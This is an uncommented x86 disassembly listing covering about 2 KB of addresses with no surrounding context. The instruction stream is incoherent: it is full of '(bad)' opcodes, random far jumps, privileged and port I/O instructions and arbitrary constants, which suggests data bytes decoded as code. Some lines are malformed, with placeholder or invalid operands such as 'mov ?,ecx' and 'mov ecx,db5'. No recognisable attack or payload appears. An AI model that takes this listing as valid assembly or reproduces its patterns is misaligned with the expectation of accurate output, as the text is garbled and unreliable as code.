  41e958:	xor    esi,DWORD PTR ds:0x4c464781
  41e95e:	lods   eax,DWORD PTR ds:[esi]
  41e95f:	(bad)  
  41e960:	push   es
  41e961:	bound  eax,QWORD PTR [edx]
  41e963:	inc    ebx
  41e964:	fwait
  41e965:	vpinsrw xmm5,xmm5,WORD PTR [eax-0x77e7489e],0xf2
  41e96e:	test   BYTE PTR [edx+ebx*1+0x560ce25],0x6d
  41e976:	push   cs
  41e977:	mov    ds,WORD PTR [eax+0x1e]
  41e97a:	in     al,dx
  41e97b:	push   0x240d8962
  41e980:	cld    
  41e981:	mov    ebp,0x44286fce
  41e986:	dec    edi
  41e987:	rcr    DWORD PTR [ecx],1
  41e989:	nop
  41e98a:	sbb    eax,0x1fc2351
  41e98f:	data16 sub al,0xdc
  41e992:	jbe    0x41e936
  41e994:	push   esp
  41e995:	mov    eax,0x5bfdcd3c
  41e99a:	mov    al,ds:0x2bf38b15
  41e99f:	sti    
  41e9a0:	adc    BYTE PTR [edi+0x18e51749],0xf1
  41e9a7:	ds test al,0x68
  41e9aa:	mov    ah,0x3a
  41e9ac:	shl    DWORD PTR [esi-0x36],cl
  41e9af:	(bad)  
  41e9b0:	daa    
  41e9b1:	loope  0x41e99d
  41e9b3:	outs   dx,BYTE PTR ds:[esi]
  41e9b4:	inc    ecx
  41e9b5:	(bad)  
  41e9b6:	repz pop eax
  41e9b8:	adc    eax,0xb858b96d
  41e9bd:	stc    
  41e9be:	push   cs
  41e9bf:	mov    eax,ds:0x71ad4cb2
  41e9c4:	or     BYTE PTR [eax+eax*4],bh
  41e9c7:	mov    ecx,0xdf8c46ff
  41e9cc:	or     eax,0x1e137f01
  41e9d1:	add    ah,bl
  41e9d3:	inc    ebp
  41e9d4:	or     DWORD PTR [edx],esi
  41e9d6:	mov    ch,0xf5
  41e9d8:	cs pop esp
  41e9da:	and    dl,ah
  41e9dc:	jae    0x41e986
  41e9de:	xor    edi,DWORD PTR [esi+ebp*2+0x220d9c62]
  41e9e5:	test   eax,0xc0d2469c
  41e9ea:	cmp    ah,BYTE PTR [esi]
  41e9ec:	mov    eax,0xbcdcfcae
  41e9f1:	or     bl,BYTE PTR [ecx-0x11405847]
  41e9f7:	fdiv   DWORD PTR [ebx-0x31b96d28]
  41e9fd:	pop    es
  41e9fe:	xlat   BYTE PTR ds:[ebx]
  41e9ff:	mov    ?,ecx
  41ea01:	xchg   esi,eax
  41ea02:	jne    0x41e9a0
  41ea04:	and    al,BYTE PTR [eax+0x21]
  41ea07:	(bad)  
  41ea08:	mov    ebp,0x7b1332d6
  41ea0d:	mov    es,WORD PTR [edx]
  41ea0f:	xor    ebx,DWORD PTR [esi-0x4702646a]
  41ea15:	bound  edx,QWORD PTR [eax+ebx*4+0x63]
  41ea19:	jns    0x41ea63
  41ea1b:	loopne 0x41ea7c
  41ea1d:	mov    dl,0x6
  41ea1f:	inc    ecx
  41ea20:	imul   ebx,DWORD PTR [edx-0x7],0xffffffb3
  41ea24:	data16 or BYTE PTR [ebx+0x49e585fe],ah
  41ea2b:	cs pusha 
  41ea2d:	sub    DWORD PTR [ebx+0x5e5d78a6],0x3d
  41ea34:	adc    bh,cl
  41ea36:	jmp    0xba8d:0xd7e88b05
  41ea3d:	call   0x93f1:0x4f52e07f
  41ea44:	jl     0x41ea26
  41ea46:	push   eax
  41ea47:	mov    ebx,0xe1610027
  41ea4c:	into   
  41ea4d:	mov    esi,0x7f4056ef
  41ea52:	or     eax,0x9b360dac
  41ea57:	mov    al,ds:0x9670438a
  41ea5c:	add    BYTE PTR [ecx+0x41],0xb6
  41ea60:	adc    ch,dh
  41ea62:	aam    0x36
  41ea64:	(bad)  
  41ea65:	dec    edx
  41ea66:	mov    esi,0x16ce02d7
  41ea6b:	pop    eax
  41ea6c:	inc    esp
  41ea6d:	loopne 0x41eae9
  41ea6f:	pop    edi
  41ea70:	int3   
  41ea71:	outs   dx,BYTE PTR ds:[esi]
  41ea72:	fwait
  41ea73:	aas    
  41ea74:	fs inc edi
  41ea76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea77:	clc    
  41ea78:	out    dx,al
  41ea79:	mov    WORD PTR [esi],?
  41ea7b:	dec    ecx
  41ea7c:	call   0xa697:0x95465b2f
  41ea83:	dec    esp
  41ea84:	sti    
  41ea85:	jmp    0x3ecef294
  41ea8a:	and    al,0x6
  41ea8c:	cli    
  41ea8d:	loope  0x41eac8
  41ea8f:	shufps xmm4,xmm0,0x62
  41ea93:	push   ss
  41ea94:	dec    ebp
  41ea95:	cs scas eax,DWORD PTR es:[edi]
  41ea97:	xor    al,0xb4
  41ea99:	fiadd  WORD PTR [esi+0x4478b1c6]
  41ea9f:	or     DWORD PTR [esi-0xa],esp
  41eaa2:	popa   
  41eaa3:	mov    cs:0x6521e0db,eax
  41eaa9:	push   esi
  41eaaa:	sbb    cl,al
  41eaac:	xchg   edi,eax
  41eaad:	enter  0x3f5c,0xe6
  41eab1:	mov    ch,0x4b
  41eab3:	dec    esp
  41eab4:	sub    DWORD PTR [ebp-0x7b58eee7],edx
  41eaba:	pushf  
  41eabb:	sbb    BYTE PTR gs:[ebx-0x4e7a76d9],bl
  41eac2:	xor    al,0xe2
  41eac4:	dec    ecx
  41eac5:	pop    ebx
  41eac6:	(bad)  
  41eac7:	cli    
  41eac8:	mov    ch,0x44
  41eaca:	das    
  41eacb:	inc    eax
  41eacc:	dec    eax
  41eacd:	xor    DWORD PTR [edx-0x536fb150],ebx
  41ead3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ead4:	xchg   esp,eax
  41ead5:	pop    eax
  41ead6:	pop    ss
  41ead7:	sub    DWORD PTR [edx+ebp*4+0x10],ecx
  41eadb:	lods   eax,DWORD PTR ds:[esi]
  41eadc:	mov    bh,0xa2
  41eade:	and    BYTE PTR [edi-0x46],ah
  41eae1:	xchg   esi,eax
  41eae2:	push   ecx
  41eae3:	jge    0x41eae3
  41eae5:	into   
  41eae6:	cld    
  41eae7:	mov    edx,0x3a3fdb0c
  41eaec:	stos   DWORD PTR es:[edi],eax
  41eaed:	pop    es
  41eaee:	add    al,al
  41eaf0:	cmp    ecx,DWORD PTR [esi-0x23]
  41eaf3:	fimul  DWORD PTR [edx-0x6bf34d0b]
  41eaf9:	out    0x87,eax
  41eafb:	mov    ah,bl
  41eafd:	pop    edi
  41eafe:	add    al,0x66
  41eb00:	push   ebx
  41eb01:	ffree  st(7)
  41eb03:	jl     0x41eaed
  41eb05:	adc    eax,0x86ad923e
  41eb0a:	sbb    DWORD PTR [esi+0x7],ebx
  41eb0d:	sti    
  41eb0e:	push   ebp
  41eb0f:	add    al,0x5c
  41eb11:	retf   0xcf04
  41eb14:	je     0x41eb2a
  41eb16:	retf   
  41eb17:	jmp    0xf8367006
  41eb1c:	jl     0x41eae4
  41eb1e:	xchg   ecx,eax
  41eb1f:	and    bl,BYTE PTR [ebp-0x56b0b50]
  41eb25:	leave  
  41eb26:	stos   BYTE PTR es:[edi],al
  41eb27:	mov    esi,0x8a97aa74
  41eb2c:	retf   0xf99d
  41eb2f:	in     eax,dx
  41eb30:	sub    DWORD PTR [ebx-0x366de3f1],0xffffffde
  41eb37:	retf   
  41eb38:	outs   dx,DWORD PTR ds:[esi]
  41eb39:	add    al,0x60
  41eb3b:	imul   ecx,eax,0xeaf53a2b
  41eb41:	ja     0x41eb00
  41eb43:	les    ecx,FWORD PTR [ebp-0x1f810c5f]
  41eb49:	add    al,0x53
  41eb4b:	pop    edx
  41eb4c:	adc    DWORD PTR [esi+0x31],edi
  41eb4f:	test   ebp,edi
  41eb51:	push   edi
  41eb52:	mov    ch,bh
  41eb54:	sar    BYTE PTR [edx-0x13],1
  41eb57:	add    cl,al
  41eb59:	ror    BYTE PTR [esi+edx*4+0x6c786110],1
  41eb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb61:	mov    ebp,0x579fa767
  41eb66:	sub    DWORD PTR [esp+eiz*2-0x1b],esp
  41eb6a:	out    0xa1,al
  41eb6c:	(bad)  
  41eb6d:	int    0xef
  41eb6f:	jp     0x41eb93
  41eb71:	cmp    esp,DWORD PTR [edi]
  41eb73:	loop   0x41ebd5
  41eb75:	int3   
  41eb76:	mov    ds:0x2b9ccd13,al
  41eb7b:	daa    
  41eb7c:	fwait
  41eb7d:	mov    ebp,0x31710b70
  41eb82:	dec    ebx
  41eb83:	lahf   
  41eb84:	rol    edx,1
  41eb86:	mov    bh,0xa1
  41eb88:	jne    0x41eb2c
  41eb8a:	adc    al,0x35
  41eb8c:	or     al,0x98
  41eb8e:	and    ebp,0x66c41239
  41eb94:	ret    
  41eb95:	pop    edi
  41eb96:	rol    BYTE PTR [edi+0x4b],1
  41eb99:	iret   
  41eb9a:	sbb    al,0xf0
  41eb9c:	push   cs
  41eb9d:	(bad)  
  41eb9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb9f:	push   esi
  41eba0:	setne  BYTE PTR [eax+0x7f9b2d19]
  41eba7:	pusha  
  41eba8:	jae    0x41eb5d
  41ebaa:	inc    esi
  41ebab:	fldenv [edi+0x33]
  41ebae:	pop    DWORD PTR [eiz*4-0x676b31de]
  41ebb5:	adc    BYTE PTR [ebx],al
  41ebb7:	cld    
  41ebb8:	stc    
  41ebb9:	add    BYTE PTR [eax+eiz*2+0x5806ed3a],bh
  41ebc0:	fcom   QWORD PTR [edi+ebp*2+0x2c]
  41ebc4:	lahf   
  41ebc5:	sub    al,BYTE PTR [ebp+edx*2-0x74f41cad]
  41ebcc:	or     dh,BYTE PTR [esi]
  41ebce:	xchg   dl,ch
  41ebd0:	xchg   esi,eax
  41ebd1:	adc    edx,DWORD PTR [ebx]
  41ebd3:	inc    si
  41ebd5:	xchg   esp,eax
  41ebd6:	mov    DWORD PTR [ebp-0x24],eax
  41ebd9:	cmc    
  41ebda:	mov    BYTE PTR [esi+ebp*8+0x7dd60e23],ah
  41ebe1:	mov    ebx,0x23983ab1
  41ebe6:	and    al,0x37
  41ebe8:	sar    DWORD PTR [ecx+0x51],0x5c
  41ebec:	addr16 or al,0x79
  41ebef:	sub    DWORD PTR [edx*8+0x10f16bff],ebx
  41ebf6:	mov    bl,0xa7
  41ebf8:	test   BYTE PTR [edi+0x2c],bh
  41ebfb:	sti    
  41ebfc:	xchg   esp,eax
  41ebfd:	loope  0x41ec23
  41ebff:	cmc    
  41ec00:	mov    DWORD PTR [eax-0x15],esp
  41ec03:	aaa    
  41ec04:	pusha  
  41ec05:	inc    edx
  41ec06:	int3   
  41ec07:	add    BYTE PTR [edi-0x5b2724ce],0x4e
  41ec0e:	push   0xae2847f8
  41ec13:	lds    esp,FWORD PTR [edx]
  41ec15:	or     DWORD PTR [edx+0x1b6b85df],ebp
  41ec1b:	ss jecxz 0x41ebd7
  41ec1e:	aas    
  41ec1f:	xchg   ebp,eax
  41ec20:	xchg   ebp,eax
  41ec21:	lahf   
  41ec22:	aad    0x53
  41ec24:	pop    edi
  41ec25:	popf   
  41ec26:	xchg   DWORD PTR [eax],ebx
  41ec28:	dec    edx
  41ec29:	jl     0x41ec7e
  41ec2b:	jmp    0x37ce6164
  41ec30:	push   0xffffffbc
  41ec32:	mov    eax,ds:0x8ddc7983
  41ec37:	xchg   esi,eax
  41ec38:	fst    QWORD PTR [ecx+esi*1-0x6e7ddfff]
  41ec3f:	nop
  41ec40:	fist   WORD PTR [ebx]
  41ec42:	inc    eax
  41ec43:	sahf   
  41ec44:	aaa    
  41ec45:	fidiv  WORD PTR [eax]
  41ec47:	bnd jbe 0x41ec60
  41ec4a:	pop    edx
  41ec4b:	call   DWORD PTR [ebp-0x20]
  41ec4e:	add    BYTE PTR [eax+eiz*1],dl
  41ec51:	scas   eax,DWORD PTR es:[edi]
  41ec52:	add    al,0x23
  41ec54:	mov    BYTE PTR [edx-0x3d],al
  41ec57:	fdivr  DWORD PTR ds:0x1001cc70
  41ec5d:	jmp    FWORD PTR [edx+ebx*1-0x2edda78a]
  41ec64:	xchg   ebx,eax
  41ec65:	cmp    al,0x8f
  41ec67:	inc    edx
  41ec68:	mov    dh,0x2b
  41ec6a:	adc    al,0xfc
  41ec6c:	push   ebp
  41ec6d:	sahf   
  41ec6e:	xor    DWORD PTR [ebx+esi*8],ebp
  41ec71:	and    eax,0x26c74b18
  41ec76:	and    eax,0xb65294eb
  41ec7b:	jo     0x41ec05
  41ec7d:	mov    edx,0x73756808
  41ec82:	in     al,dx
  41ec83:	push   ebx
  41ec84:	sbb    DWORD PTR [eax-0x3a601ae7],edx
  41ec8a:	xchg   ebx,eax
  41ec8b:	xor    ebx,DWORD PTR [ebx-0x7b]
  41ec8e:	fwait
  41ec8f:	sub    esp,edi
  41ec91:	jmp    0x6a4517cc
  41ec96:	ds ds loop 0x41ece2
  41ec9a:	lahf   
  41ec9b:	cmc    
  41ec9c:	retf   
  41ec9d:	push   cs
  41ec9e:	xor    edx,DWORD PTR [ebp+0x70dd5b0f]
  41eca4:	shl    BYTE PTR [ebp+0x48836047],cl
  41ecaa:	push   ds
  41ecab:	push   edx
  41ecac:	pusha  
  41ecad:	push   es
  41ecae:	stos   DWORD PTR es:[edi],eax
  41ecaf:	inc    ebp
  41ecb0:	test   DWORD PTR [edx],edx
  41ecb2:	int3   
  41ecb3:	imul   ebx,DWORD PTR [eax],0xffffff9e
  41ecb6:	daa    
  41ecb7:	enter  0x1706,0xae
  41ecbb:	mov    ch,BYTE PTR [ebx-0x4c]
  41ecbe:	fnstcw WORD PTR [ebp+0x1438669c]
  41ecc4:	mov    bl,0x10
  41ecc6:	fidivr DWORD PTR [ebx-0x80]
  41ecca:	dec    eax
  41eccb:	call   0xf284:0xab3e62f5
  41ecd2:	jb     0x41ecb1
  41ecd4:	scas   al,BYTE PTR es:[edi]
  41ecd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecd6:	push   ebp
  41ecd7:	(bad)  
  41ecd9:	inc    ebp
  41ecda:	sub    ah,bh
  41ecdc:	std    
  41ecdd:	adc    eax,0xe116e3c8
  41ece2:	xchg   esp,eax
  41ece3:	scas   eax,DWORD PTR es:[edi]
  41ece4:	sbb    BYTE PTR [esi],bh
  41ece6:	stc    
  41ece7:	push   0xffffffb6
  41ece9:	in     al,dx
  41ecea:	push   0x51
  41ecec:	mov    edx,0x6326aea0
  41ecf1:	mov    edi,0x1bac9048
  41ecf6:	(bad)  [esi+eax*8]
  41ecf9:	(bad)  [ebp-0x19ef0a14]
  41ecff:	outs   dx,BYTE PTR ds:[esi]
  41ed00:	or     edx,DWORD PTR [edx+ecx*2-0x62ecc793]
  41ed07:	icebp  
  41ed08:	mov    bl,0x1
  41ed0a:	and    esp,DWORD PTR [esi]
  41ed0c:	cmc    
  41ed0d:	test   eax,0xa04a82c5
  41ed12:	(bad)  
  41ed13:	int3   
  41ed14:	inc    ecx
  41ed15:	arpl   sp,si
  41ed17:	test   DWORD PTR [ebp+esi*8+0x54],esp
  41ed1b:	pop    edx
  41ed1c:	mov    eax,ds:0x88547690
  41ed21:	cli    
  41ed22:	lods   al,BYTE PTR ds:[esi]
  41ed23:	xchg   ebp,eax
  41ed24:	out    dx,eax
  41ed25:	mov    edx,0xeb97db5a
  41ed2b:	cdq    
  41ed2c:	xor    bh,al
  41ed2e:	pop    edx
  41ed2f:	xchg   edx,eax
  41ed30:	add    BYTE PTR [ecx-0x3b735947],0xf5
  41ed37:	lods   al,BYTE PTR ds:[esi]
  41ed38:	push   es
  41ed39:	ja     0x41ecef
  41ed3b:	cs jmp 0x133b:0x78e4c955
  41ed43:	ins    DWORD PTR es:[edi],dx
  41ed44:	(bad)  [ebp-0x1]
  41ed47:	cdq    
  41ed48:	mov    ds:0x2155e911,al
  41ed4d:	jno    0x41ed8f
  41ed4f:	test   eax,0xfd7eec29
  41ed54:	add    dh,dl
  41ed56:	push   0x50
  41ed58:	popf   
  41ed59:	sahf   
  41ed5a:	inc    esp
  41ed5b:	aad    0xe3
  41ed5d:	dec    ebx
  41ed5e:	sbb    al,0x44
  41ed60:	push   0xffffffa6
  41ed62:	jmp    0x88c8ba53
  41ed67:	inc    edx
  41ed68:	and    al,0xab
  41ed6a:	nop
  41ed6b:	pop    es
  41ed6c:	cld    
  41ed6d:	jns    0x41ed4a
  41ed6f:	les    esp,FWORD PTR [ecx+0x22]
  41ed72:	and    eax,0x8679b1f6
  41ed77:	add    ch,BYTE PTR [ebp-0xf502b9]
  41ed7d:	push   edx
  41ed7e:	push   cs
  41ed7f:	dec    ecx
  41ed80:	mov    cl,0xf1
  41ed82:	add    al,0xfe
  41ed84:	jb     0x41ed14
  41ed86:	xor    DWORD PTR [ebp-0x54],eax
  41ed89:	or     esp,0x5dd5ba9e
  41ed8f:	sub    esp,DWORD PTR [edi]
  41ed91:	adc    al,0x5c
  41ed93:	leave  
  41ed94:	lds    eax,FWORD PTR [eax-0x5420c3]
  41ed9a:	mov    bl,0x47
  41ed9c:	pop    ds
  41ed9d:	add    DWORD PTR [esi+0x72],0x75
  41eda1:	pop    ecx
  41eda2:	add    DWORD PTR [ecx+0x224a7fa3],ebp
  41eda8:	pop    esp
  41eda9:	mov    al,ds:0x75688984
  41edae:	je     0x41ed99
  41edb0:	ror    eax,0x92
  41edb3:	cmp    dl,BYTE PTR [ebx-0x6e73c812]
  41edb9:	into   
  41edba:	dec    edi
  41edbb:	lea    esp,ds:[edx+0x55]
  41edbf:	sbb    BYTE PTR [esi+0xe],cl
  41edc2:	xchg   edi,eax
  41edc3:	sbb    esi,ebp
  41edc5:	push   0xffffffb2
  41edc7:	loopne 0x41ee42
  41edc9:	push   ebx
  41edca:	sbb    DWORD PTR [edx-0x77],ebx
  41edcd:	fsub   DWORD PTR [esi]
  41edcf:	nop
  41edd0:	pop    esi
  41edd1:	xchg   DWORD PTR [ecx-0x529749a6],edx
  41edd7:	pushf  
  41edd8:	scas   al,BYTE PTR es:[edi]
  41edd9:	cmp    bh,BYTE PTR [eax]
  41eddb:	imul   eax,DWORD PTR [edx+0xa],0xfa7360e0
  41ede2:	shl    BYTE PTR ds:0x82707bdc,1
  41ede8:	sar    BYTE PTR [edi+0x61f44792],0x73
  41edef:	or     ecx,edi
  41edf1:	cmp    BYTE PTR [edx],dl
  41edf3:	loop   0x41edc7
  41edf5:	je     0x41edd2
  41edf7:	and    BYTE PTR [eax],cl
  41edf9:	sbb    eax,0xd2b51f51
  41edfe:	push   eax
  41edff:	ret    
  41ee00:	mov    esp,0x25e595bc
  41ee05:	(bad)  
  41ee06:	mov    eax,esp
  41ee08:	cmp    ah,cl
  41ee0a:	sub    eax,0x7c3f3b32
  41ee0f:	lea    esp,[edx]
  41ee11:	neg    ebx
  41ee13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee14:	inc    ecx
  41ee15:	mov    ds:0xe90b38a9,al
  41ee1a:	mov    ebx,0x996d9b37
  41ee1f:	imul   esi,edi,0xffffffd9
  41ee22:	pop    ebp
  41ee23:	xchg   ebp,eax
  41ee24:	dec    eax
  41ee25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee26:	jecxz  0x41ee40
  41ee28:	test   DWORD PTR [ebx-0x70aa3f80],ebp
  41ee2e:	cmp    eax,edx
  41ee30:	popa   
  41ee31:	push   eax
  41ee32:	ror    DWORD PTR [edx-0x1f9654de],0x63
  41ee39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee3a:	sbb    ah,dl
  41ee3c:	push   edx
  41ee3d:	cld    
  41ee3e:	ins    DWORD PTR es:[edi],dx
  41ee3f:	pushf  
  41ee40:	mov    eax,0xa613e4ca
  41ee45:	(bad)
  41ee48:	loop   0x41ede0
  41ee4a:	mov    bh,0x8a
  41ee4c:	mov    ebp,0x2a0eccfd
  41ee51:	push   ebx
  41ee52:	loopne 0x41ee2a
  41ee54:	pop    ss
  41ee55:	mov    ecx,db5
  41ee58:	lds    ebx,FWORD PTR [esi+0x49efdd01]
  41ee5e:	sub    BYTE PTR [ebx],ah
  41ee60:	shl    DWORD PTR [esi+0x14],cl
  41ee63:	mov    esi,?
  41ee65:	add    DWORD PTR [esp+eax*2-0x220384a7],ebx
  41ee6c:	push   ebx
  41ee6d:	ins    BYTE PTR es:[edi],dx
  41ee6e:	pop    ebp
  41ee6f:	mov    eax,0x50d1d1c5
  41ee74:	xchg   ebp,eax
  41ee75:	inc    ebx
  41ee76:	retf   0x62f8
  41ee79:	adc    al,BYTE PTR [ecx+0x48]
  41ee7c:	into   
  41ee7d:	add    eax,0x6e641d5d
  41ee82:	push   esp
  41ee83:	sub    BYTE PTR [esi+0x4f],0x89
  41ee87:	cdq    
  41ee88:	cs push ecx
  41ee8a:	icebp  
  41ee8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee8d:	std    
  41ee8e:	xor    edx,DWORD PTR [ebp+0x6b]
  41ee91:	loopne 0x41ee6c
  41ee93:	in     al,0xc3
  41ee95:	addr16 repnz xchg edx,eax
  41ee98:	mov    eax,0x14ae51d2
  41ee9d:	or     DWORD PTR [ebp-0x3e],edi
  41eea0:	popa   
  41eea1:	outs   dx,BYTE PTR ds:[esi]
  41eea2:	xor    eax,0x84a14c70
  41eea7:	push   ds
  41eea8:	addr16 in eax,dx
  41eeaa:	movd   DWORD PTR [ebx-0x5136cfab],mm6
  41eeb1:	and    al,0xab
  41eeb3:	pop    edi
  41eeb4:	stc    
  41eeb5:	adc    DWORD PTR [ebx+eax*8],ebx
  41eeb8:	jmp    0x91c9:0xce774488
  41eebf:	je     0x41ef20
  41eec1:	inc    ebp
  41eec2:	jge    0x41eeba
  41eec4:	hlt    
  41eec5:	les    ebx,FWORD PTR [edx-0xb]
  41eec8:	in     al,0xe8
  41eeca:	and    al,0x67
  41eecc:	adc    DWORD PTR [ebx-0x587b800f],0x18093fd3
  41eed6:	or     ebx,DWORD PTR [eax-0x3a70c6a1]
  41eedc:	sbb    ebx,edx
  41eede:	push   ecx
  41eedf:	xchg   bp,ax
  41eee1:	xor    eax,0xad4034f0
  41eee6:	clc    
  41eee7:	gs mov edx,0x83bae340
  41eeed:	and    dh,ch
  41eeef:	aaa    
  41eef0:	js     0x41eecf
  41eef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eef3:	dec    edx
  41eef4:	sub    ebx,esp
  41eef6:	mov    eax,ds:0xc2bf4c41
  41eefb:	in     al,dx
  41eefc:	sub    ecx,DWORD PTR [ecx+0x1d]
  41eeff:	inc    eax
  41ef00:	sahf   
  41ef01:	xchg   esp,eax
  41ef02:	jne    0x41ef7f
  41ef04:	aaa    
  41ef05:	add    BYTE PTR [eax+0x1e],ch
  41ef08:	ret    0xefb
  41ef0b:	popf   
  41ef0c:	mov    dh,0xac
  41ef0e:	inc    edi
  41ef0f:	pop    ss
  41ef10:	daa    
  41ef11:	mov    bh,0xcd
  41ef13:	jne    0x41ef06
  41ef15:	jb     0x41ef26
  41ef17:	xchg   edi,eax
  41ef18:	scas   eax,DWORD PTR es:[edi]
  41ef19:	mov    bh,0x43
  41ef1b:	(bad)  
  41ef1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef1d:	xor    al,0x8c
  41ef1f:	arpl   WORD PTR ds:0xbd4e967c,bp
  41ef25:	pop    ebx
  41ef26:	imul   edx,DWORD PTR [ecx-0x1d575357],0xffffff98
  41ef2d:	jge    0x41eec6
  41ef2f:	cmc    
  41ef30:	inc    ecx
  41ef31:	dec    ecx
  41ef32:	push   edx
  41ef33:	xchg   esp,eax
  41ef34:	pushf  
  41ef35:	jo     0x41ef79
  41ef37:	loope  0x41eefe
  41ef39:	jge    0x41ef4d
  41ef3b:	xchg   edi,eax
  41ef3c:	cmp    bh,BYTE PTR [esi+edx*2-0x791f6666]
  41ef43:	inc    edi
  41ef44:	mov    esi,0x8beb1eaf
  41ef49:	xchg   esi,eax
  41ef4a:	add    BYTE PTR [esi-0x5bee639d],dl
  41ef50:	leave  
  41ef51:	dec    edx
  41ef52:	or     dl,BYTE PTR [esp+eiz*2-0x36]
  41ef56:	std    
  41ef57:	inc    ebp
  41ef58:	repnz inc esp
  41ef5a:	xor    bl,cl
  41ef5c:	dec    ebx
  41ef5d:	mov    ebp,0xb517baaf
  41ef62:	jg     0x41efbb
  41ef64:	mov    fs,esp
  41ef66:	retf   
  41ef67:	call   0xdc5a:0x6df842f
  41ef6e:	cmp    al,0x25
  41ef70:	push   ecx
  41ef71:	dec    eax
  41ef72:	(bad)  
  41ef73:	ins    DWORD PTR es:[edi],dx
  41ef74:	retf   
  41ef75:	inc    ebx
  41ef76:	fs sub eax,0x40c280f
  41ef7c:	sahf   
  41ef7d:	(bad)  
  41ef7f:	or     esp,DWORD PTR [esi]
  41ef81:	les    edx,FWORD PTR [ebx+0x3e]
  41ef84:	pop    es
  41ef85:	jmp    0xbea:0x5299cd1
  41ef8c:	stos   BYTE PTR es:[edi],al
  41ef8d:	jnp    0x41efc9
  41ef8f:	mov    ecx,0x7c9b1b3c
  41ef94:	mov    ah,0x11
  41ef96:	enter  0x7e84,0x48
  41ef9a:	ins    DWORD PTR es:[edi],dx
  41ef9b:	popf   
  41ef9c:	dec    ecx
  41ef9d:	push   edx
  41ef9e:	clc    
  41ef9f:	sahf   
  41efa0:	inc    esp
  41efa1:	inc    edx
  41efa2:	pop    ebx
  41efa3:	out    dx,al
  41efa4:	mov    edx,0x23700a85
  41efa9:	(bad)  
  41efaa:	mov    BYTE PTR [edi+ebp*4],al
  41efad:	xchg   BYTE PTR [ebp+0xc],bh
  41efb0:	jmp    DWORD PTR [edi-0x2f]
  41efb3:	js     0x41ef4b
  41efb5:	xchg   ebx,eax
  41efb6:	in     al,dx
  41efb7:	cmp    DWORD PTR [edx+eiz*4-0x4fe3c63],edx
  41efbe:	stos   BYTE PTR es:[edi],al
  41efbf:	dec    ecx
  41efc0:	iret   
  41efc1:	(bad)  
  41efc3:	aad    0xf1
  41efc5:	cwde   
  41efc6:	out    0x48,eax
  41efc8:	or     bl,cl
  41efca:	cmp    al,0x47
  41efcc:	xchg   ebx,eax
  41efcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efce:	and    BYTE PTR [edx],cl
  41efd0:	or     ch,BYTE PTR [esi+eiz*2-0x62]
  41efd4:	cld    
  41efd5:	pop    edx
  41efd6:	mov    eax,0x2b0ad64c
  41efdb:	cmp    BYTE PTR [edi],bh
  41efdd:	retf   
  41efde:	pop    eax
  41efdf:	add    BYTE PTR [ecx],ch
  41efe1:	push   eax
  41efe2:	and    dh,BYTE PTR [ebx-0x6f283858]
  41efe8:	mov    edx,0xc31b1705
  41efed:	xchg   ebp,eax
  41efee:	inc    edi
  41efef:	inc    eax
  41eff0:	xchg   esi,eax
  41eff1:	push   esi
  41eff2:	fisttp DWORD PTR [eax+0x7]
  41eff5:	sbb    BYTE PTR [ebx],dl
  41eff7:	push   edx
  41eff8:	mov    eax,ds:0x579ca93a
  41effd:	retf   
  41effe:	jb     0x41ef9a
  41f000:	not    BYTE PTR [ecx+0x77]
  41f003:	add    DWORD PTR ds:0xb8774edf,esp
  41f009:	in     eax,0x17
  41f00b:	xor    al,0x1b
  41f00d:	out    dx,al
  41f00e:	int3   
  41f00f:	sbb    BYTE PTR [edx-0x47be98b5],ah
  41f015:	sbb    cl,dh
  41f017:	cmp    DWORD PTR [edx-0xc5e651b],ebp
  41f01d:	jp     0x41f01c
  41f01f:	mov    ah,0x51
  41f021:	leave  
  41f022:	cmp    eax,0xc9143f9
  41f027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f028:	inc    edx
  41f029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f02a:	cmc    
  41f02b:	add    DWORD PTR [edx],ebx
  41f02d:	aad    0x63
  41f02f:	imul   esi,DWORD PTR [edx+0x32],0xffffffc4
  41f033:	jle    0x41f03e
  41f035:	pop    ebx
  41f036:	xchg   edx,eax
  41f037:	mov    ds:0x2b2601c3,eax
  41f03c:	das    
  41f03d:	jmp    0x41f048
  41f03f:	dec    ecx
  41f040:	mov    eax,ds:0xa3b9958
  41f045:	pushf  
  41f046:	sbb    dl,dh
  41f048:	xchg   bh,cl
  41f04a:	(bad)  
  41f04b:	fstp   QWORD PTR [esi-0x51]
  41f04e:	and    DWORD PTR ds:0x7e2ae7c0,ecx
  41f054:	push   ebp
  41f055:	adc    al,0x6a
  41f057:	jno    0x41efdd
  41f059:	sbb    cl,BYTE PTR [ebx]
  41f05b:	sti    
  41f05c:	and    eax,0x6c68eaba
  41f061:	sbb    DWORD PTR [edx+0x5e7fa707],ecx
  41f067:	cmp    DWORD PTR [ebx+0x68],0x19
  41f06b:	sbb    BYTE PTR [ebx+0x65],0x37
  41f06f:	push   ebx
  41f070:	and    DWORD PTR [esi+0x2d2124d0],ebp
  41f076:	jns    0x41f0ae
  41f078:	jno    0x41f087
  41f07a:	push   es
  41f07b:	sti    
  41f07c:	fidivr DWORD PTR ds:[eax+0x454eb7ae]
  41f083:	and    ah,BYTE PTR [ebp-0x2c6e89c]
  41f089:	pop    ebx
  41f08a:	mov    esi,0xc0e011ad
  41f08f:	enter  0x7884,0xdb
  41f093:	mov    esi,0x6ceab310
  41f098:	es ss stc 
  41f09b:	add    eax,0x229aa150
  41f0a0:	dec    ebp
  41f0a1:	push   cs
  41f0a2:	cmp    eax,0xe61e155e
  41f0a7:	ret    
  41f0a8:	(bad)  
  41f0aa:	fist   DWORD PTR [esi+0x4]
  41f0ad:	xor    DWORD PTR ds:0x183e5196,edx
  41f0b3:	ds mov ch,0x46
